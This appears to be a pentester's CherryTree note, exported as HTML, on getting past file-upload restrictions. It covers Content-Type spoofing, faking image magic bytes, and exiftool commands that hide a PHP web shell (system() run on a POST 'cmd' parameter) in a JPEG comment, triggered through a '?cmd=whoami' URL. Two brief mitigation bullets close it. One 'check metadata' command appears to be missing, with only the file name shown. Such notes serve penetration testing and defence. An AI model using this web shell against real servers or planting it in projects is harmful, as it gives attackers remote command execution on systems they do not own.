<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Bypass Content-Type & add bytes of a real image</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>Bypass Content-Type & add bytes of a real image</h1><br /><br /><br /><strong>Bypass Content-Type
      &amp; add bytes of a real image</strong><br />1. <span style="text-decoration:underline;">Bypass
      Content-Type</span> checks by setting the value of the Content-Type header to: image/png , text/plain ,
    application/octet-stream<br /> Content-Type wordlist: <a
      href="https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt" target="_blank">https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt</a><br />2.
    <span style="text-decoration:underline;">Bypass magic number check by adding at the beginning of the file the bytes
      of a real image</span> (confuse the file command). <br /> To use exiftool we need to edit a previously created
    image(example:img.jpg): <br />
    <h2> </h2>
    <div class="codebox">
      <div class="codebox">
        exiftool&nbsp;-comment=&#39;&lt;?php&nbsp;echo&nbsp;&#39;Command:&#39;;&nbsp;if($_POST){system($_POST[&#39;cmd&#39;]);}&nbsp;__halt_compiler();&#39;&nbsp;img.jpg<br />#if&nbsp;it&nbsp;does&nbsp;not&nbsp;work<br />exiftool&nbsp;-Comment=&quot;&lt;?php&nbsp;echo&nbsp;&#39;Command:&#39;;&nbsp;if($_POST){system($_POST[&#39;cmd&#39;]);}&nbsp;__halt_compiler();&quot;&nbsp;img.jpg
      </div>
    </div><br /> Check metadata comments with:<br />
    <div class="codebox">
      <div class="codebox">img.jpg</div>
    </div><br /> with this method we do NOT need a shell listening but from the address bar insert the command
    line:<br />
    <div class="codebox">
      <div class="codebox">/img.jpg?cmd=whoami</div>
    </div><br />see also:<br /><a
      href="https://infinitelogins.com/2020/08/07/file-upload-bypass-techniques/" target="_blank">https://infinitelogins.com/2020/08/07/file-upload-bypass-techniques/</a><br /><a
      href="https://null-byte.wonderhowto.com/how-to/bypass-file-upload-restrictions-web-apps-get-shell-0323454/" target="_blank">https://null-byte.wonderhowto.com/how-to/bypass-file-upload-restrictions-web-apps-get-shell-0323454/</a><br /><br /><br /><br /><strong>Security
      Measures</strong><br />• apply filters<br />• turn off execution privileges so the exploits are never executed
    also if they get uploaded successfully
  </div>
</body>

</html>